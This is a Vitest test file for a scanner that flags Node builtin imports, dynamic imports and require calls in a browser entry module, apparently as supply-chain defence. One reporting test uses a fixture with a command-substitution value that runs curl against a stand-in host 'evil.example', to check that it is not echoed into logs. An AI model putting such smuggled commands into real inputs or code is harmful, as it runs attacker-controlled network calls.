import { builtinModules } from "node:module";
import { describe, expect, it } from "vitest";
import { auditBrowserModule } from "../scripts/audit-browser-module.mjs";

/**
 * This replaces a hand-written scanner whose own comment was wrong: it claimed code inside a
 * template literal's `${}` was still reached, but the scan skipped to the closing backtick. Both
 * fixtures below returned clean from it.
 *
 * The parser here is the installed TypeScript one, via the same `typescript/unstable` API the
 * `@fairux/ast` package uses, so it runs only where `node_modules` exists — the unprivileged
 * prepare job and ordinary CI, never the publish job.
 */

const audit = (source: string) => auditBrowserModule(source, builtinModules);

describe("browser entry — the template-expression misses", () => {
  it("finds a dynamic import inside a template expression", () => {
    expect(audit('const x = `${import("node:fs")}`;')).toContain(
      "browser entry performs a dynamic import",
    );
  });

  it("finds a require inside a template expression", () => {
    expect(audit('const y = `${require("fs")}`;')).toContain("browser entry calls require()");
  });

  it("finds one nested two template literals deep", () => {
    expect(audit('const z = `a${`b${import("node:fs")}`}c`;').length).toBeGreaterThan(0);
  });
});

describe("browser entry — runtime module loads, whatever the specifier", () => {
  it.each([
    'import("node:fs");',
    'import(/* webpackIgnore: true */ "node:fs");',
    "import(`node:fs`);",
    'import("node:" + "fs");',
    "import(specifier);",
    'require("fs");',
    'require /* c */ ("fs");',
    'function f() { return import("./chunk.js"); }',
    'const o = { m() { return require("fs"); } };',
    'class C { m() { return import("x"); } }',
  ])("refuses %j", (source) => {
    expect(audit(source).length).toBeGreaterThan(0);
  });

  it("refuses a dynamic import of something that is not a builtin at all", () => {
    // The specifier is never extracted, so there is nothing left to obfuscate.
    expect(audit('import("./local-chunk.js");')).toContain(
      "browser entry performs a dynamic import",
    );
  });
});

describe("browser entry — static Node builtins", () => {
  it.each([
    ['import "node:fs";', "node:fs"],
    ['import fs from "node:fs";', "node:fs"],
    ['import * as path from "node:path";', "node:path"],
    ['import { readFile } from "node:fs/promises";', "node:fs/promises"],
    ['export { fileURLToPath } from "node:url";', "node:url"],
    ['export * from "node:os";', "node:os"],
    ['import fs from "fs";', "fs"],
  ])("refuses %j", (source, specifier) => {
    expect(audit(source)).toContain(
      `browser entry statically imports the Node builtin ${specifier}`,
    );
  });
});

describe("browser entry — what is allowed", () => {
  it.each([
    "export const x = 1;",
    "import.meta.url;",
    "const url = import.meta.resolve('./x.js');",
    "const text = \"import('node:fs')\";",
    "const text = `import('node:fs')`;",
    '// import("node:fs")',
    '/* import("node:fs") */',
    'obj.require("fs");',
    'this.require("fs");',
    'import { scan } from "./html.js";',
    'export * from "happy-dom";',
    "const requireAuth = () => 1; requireAuth;",
    "",
  ])("accepts %j", (source) => {
    expect(audit(source)).toEqual([]);
  });
});

describe("browser entry — reporting", () => {
  it("reports each distinct problem once", () => {
    expect(audit('import("a"); import("b"); import("c");')).toEqual([
      "browser entry performs a dynamic import",
    ]);
  });

  it("reports a builtin import and a runtime load separately", () => {
    expect(audit('import "node:fs";\nexport const x = import("y");')).toHaveLength(2);
  });

  it("does not echo the specifier of a runtime load", () => {
    // Nothing is extracted from a dynamic import, so an attacker-shaped specifier cannot be
    // repeated back into a log.
    expect(audit('import("$(curl evil.example)");').join("\n")).not.toContain("curl evil.example");
  });
});
